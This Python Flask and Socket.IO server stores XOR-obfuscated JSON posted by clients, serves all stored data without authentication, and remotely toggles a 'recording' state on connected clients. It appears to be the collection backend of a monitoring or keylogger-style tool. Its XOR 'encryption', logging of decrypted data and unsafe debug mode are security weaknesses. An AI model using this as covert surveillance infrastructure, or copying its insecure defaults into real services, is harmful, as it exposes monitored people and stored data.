import os
import json
import logging
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
from config.config_server import NAME_FILE
from xor_encryption import XOREncryption

app = Flask(__name__)
socketio = SocketIO(app)

name_log = "logs"

if not os.path.exists(name_log):
    os.makedirs(name_log)

logging.basicConfig(
    filename="logs/log.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filemode="a"
)


is_recording_active = False


def initialize_server() -> None:
    """
    Ensures that the necessary directories exist for storing data.
    Creates the folder if it does not exist.
    """
    logging.info("Initializing server and checking necessary folders.")

    # Determine the folder path based on the configuration
    folder_path = os.path.dirname(NAME_FILE)

    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        logging.info(f"The folder {folder_path} was created.")
    else:
        logging.info(f"The folder {folder_path} already exists.")


initialize_server()


@app.route('/', methods=['POST'])
def store_new_data():
    """
    Handles POST requests to store new data in the JSON file.
    Validates the data, loads existing data, appends the new entry,
    and saves it back to the file.
    """
    logging.info("Processing new data for storage.")

    # Get raw data from the request body and decrypt it
    data = request.data.decode('utf-8')
    logging.debug(f"Decrypted data: {data}")

    data = decrypt_data(data)
    new_data = json.loads(data)

    if not isinstance(new_data, dict):
        logging.error("Invalid data received")
        return jsonify({"error": "Invalid data format. Expected a JSON object."}), 400

    # Load existing data, append new data and save it
    old_data = load_existing_data()
    data = append_to_data_list(old_data, new_data)
    save_data_to_file(data)

    logging.info("New data saved successfully.")
    return jsonify({"message": "Data saved successfully"}), 200


def decrypt_data(data) -> str:
    try:
        logging.info("Attempting to decrypt data.")
        computer = XOREncryption()
        decrypted_data = computer.decrypt(data)
        logging.debug(f"Decrypted data: {decrypted_data}")
        return decrypted_data
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        return ""


def append_to_data_list(old_data, new_data) -> list:
    """
    Appends new data to the existing data list.
    Ensures that the new data is a dictionary before appending.
    """
    logging.info("Appending new data to existing data list.")

    if not isinstance(new_data, dict):
        logging.error("Data structure mismatch.")
        return old_data  # Return the old data without modification

    old_data.append(new_data)
    logging.debug(f"Data list after append: {old_data}")
    return old_data


def load_existing_data() -> list:
    """Loads existing data from the JSON file or returns an empty list."""
    logging.info("Loading existing data from file.")

    if not os.path.exists(NAME_FILE):
        logging.warning(f"Data file {NAME_FILE} does not exist.")
        return []

    try:
        with open(NAME_FILE, "r") as file:
            data = json.load(file)
            logging.debug(f"Loaded data: {data}")
            return data if isinstance(data, list) else []
    except (json.JSONDecodeError, IOError) as e:
        logging.error(f"Failed to load JSON file: {e}")
        return []


def save_data_to_file(data_list) -> None:
    """
    Saves the provided data list to the JSON file.
    Skips writing if the data list is empty.
    """
    logging.info("Saving data to file.")

    if not data_list:
        logging.warning("save_data_to_file was called with empty data, skipping file write.")
        return

    try:
        logging.info("Storing encrypted data into file.")
        with open(NAME_FILE, "w") as file:
            json.dump(data_list, file, indent=4)

        logging.info("Data successfully stored in file.")

    except IOError as e:
        logging.error(f"Failed to write data to file: {e}")


@app.route('/', methods=['GET'])
def get_data():
    """
    Handles GET requests to retrieve stored data from the JSON file.
    If no data is found, returns an error message.
    """
    logging.info("Processing GET request to retrieve data.")

    # Load data from the file
    data = load_existing_data()

    if not data:
        logging.error("No data available in the file.")
        return jsonify({"error": "No data available"}), 404

    logging.info("Returning stored data.")
    return jsonify({"data": data}), 200


@app.route('/toggle_recording', methods=['POST'])
def toggle_recording():
    """
    Toggles the recording status and emits the updated status to clients.
    """
    global is_recording_active
    is_recording_active = not is_recording_active
    logging.info(f"Recording status changed to: {is_recording_active}")

    # Emit the new status to all connected clients
    socketio.emit('update_recording_status', {'recording': is_recording_active})

    return jsonify({"recording": is_recording_active})


@socketio.on('connect')
def handle_connect():
    """
    Handles a new client connection to the WebSocket server.
    """
    logging.info("New client connected.")
    return "Client connected"


if __name__ == '__main__':
    socketio.run(app,debug=True, allow_unsafe_werkzeug=True)